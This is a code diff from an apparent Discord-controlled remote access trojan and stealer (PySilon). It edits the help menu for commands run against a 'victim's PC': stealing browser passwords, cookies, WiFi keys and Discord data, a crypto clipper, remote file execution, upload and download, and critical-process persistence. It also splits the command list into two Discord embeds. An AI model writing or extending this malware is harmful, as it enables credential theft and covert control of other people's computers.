@@ -389,7 +389,7 @@ help = {
         'stop-clipper': ['➡️ `.stop-clipper`', 'Stops the Crypto Clipper thread on the victim\'s PC'],
         'set-critical': ['➡️ `.set-critical`', 'Elevates the process to critical status.'],
         'unset-critical': ['➡️ `.unset-critical`', 'Removes the critical status from the process.'],
-        'grab': ['➡️ `.grab <what-to-grab>`', 'Grabs specified information. Options:\n🔹passwords - grabs all browser-saved passwords\n🔹history - grabs the browser history\n🔹cookies - grabs browser-cookies\n🔹wifi - grabs all WiFi saved passwords\n🔹discord - grabs all possible information from victim\'s Discord account'],
+        'grab': ['➡️ `.grab <what-to-grab>`', 'Grabs specified information. Options:\n🔹passwords - grabs all browser-saved passwords\n🔹history - grabs the browser history\n🔹cookies - grabs browser-cookies\n🔹wifi - grabs all WiFi saved passwords\n🔹discord - grabs all possible information from victim\'s Discord account\n🔹discord - grabs discord information, passwords & cookies'],
         'clear': ['➡️ `.clear`', 'Clears all messages on the file-related channel'],
         'pwd': ['➡️ `.pwd`', 'Displays current directory path'],
         'ls': ['➡️ `.ls`', 'Lists current directory content'],
@@ -398,7 +398,9 @@ help = {
         'download': ['➡️ `.download <file-or-directory-name>`', 'Downloads specified file or folder. Options:\n🔹file-or-directory-name - name of file or directory that you want to download'],
         'upload': ['➡️ `.upload <type> <name>`', 'Uploads a file to victim\'s PC. Options:\n🔹type - single/multiple files whether it\'s smaller or larger than 25MB (single=smaller, multiple=larger)\n🔹name - name of uploaded file on victim\'s PC'],
         'execute': ['➡️ `.execute <file-name>`', 'Execute specified file on the victim\'s PC'],
-        'remove': ['➡️ `.remove <file-or-directory-name>`', 'Removes the specified file or directory. Options:\n🔹file-or-directory-name - name of file or directory that you want to remove'],
+        'remove': ['➡️ `.remove <file-or-directory-name>`', 'Removes the specified file or directory. Options:\n🔹file-or-directory-name - name of file or directory that you want to remove']
+    },
+    'commands2': {
         'blacklist': ['➡️ `.blacklist <process-name>`', 'Adds the specified process to the blacklist.'],
         'whitelist': ['➡️ `.whitelist <process-name>`', 'Removes the specified process from the blacklist.'],
         'turnoff': ['➡️ `.turnoff`', 'Turns all monitors off'],
@@ -457,6 +459,10 @@ async def on_message(message):
                     embed = discord.Embed(title='List of all available commands', color=0x49fc03)
                     for i in help['commands'].keys():
                         embed.add_field(name=help['commands'][i][0], value=help['commands'][i][1], inline=False)
+                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
+                    embed = discord.Embed(color=0x49fc03)
+                    for i in help['commands2'].keys():
+                        embed.add_field(name=help['commands2'][i][0], value=help['commands2'][i][1], inline=False)
                     reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                     #.log Sent message with PySilon commands manual
                 
